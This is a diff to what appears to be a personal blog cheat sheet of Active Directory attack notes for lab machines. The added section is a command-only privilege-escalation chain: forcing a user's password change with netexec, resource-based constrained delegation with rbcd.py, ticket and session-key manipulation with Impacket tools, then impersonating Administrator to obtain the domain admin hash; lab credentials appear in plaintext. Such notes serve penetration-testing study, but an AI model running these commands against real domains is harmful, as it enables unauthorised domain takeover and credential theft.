@@ -1,6 +1,6 @@
 +++
 date = '2026-11-14T08:43:23+06:30'
-title = 'AD Attacking'
+title = 'Active Directory'
 cover = '/images/covers/47.jpeg'
 +++
 
@@ -127,8 +127,34 @@ export KRB5CCNAME=ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
 
 `proxychains -q certipy-ad find -u nigel.mills -p Sail2Boat3 -dc-ip 10.129.234.42 -dns-tcp -vulnerable -enabled -stdout` | using proxychains with socks5
 
+## Privilege Escalation
 
-## Windows ECS
+```bash
+ForceChangePassword
+
+nxc ldap DC.phantom.vl -u svc_sspr -p gB6XTcqVP5MlP7Rc -M change-password -o USER=WSILVA PASSWORD=whoami69
+
+#---------------
+
+AddAllowedToAct
+
+netexec smb dc.phantom.vl -u wsilva -p whoami69
+
+netexec ldap dc.phantom.vl -u wsilva -p whoami69 -M maq -> machineaccountquota: 0 so we attack rbcd
+
+rbcd.py -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:whoami -dc-ip [$target_ip]
+
+getTGT.py phantom.vl/wsilva:whoami69
+
+describeTicket.py wsilva.ccache -> Tikcet Session Key: [take_key_from_that]
+
+changepasswd.py -newhashes :[take_key_from_that] phantom/wsilva:whoami69@dc.phantom.vl
+
+KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
+
+KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache netexec smb dc.phantom.vl --use-kcache -> we will get administrator hash so just use evil-winrm and pwn3d it 
+#---------------
+```
 
 ### ESC1
 
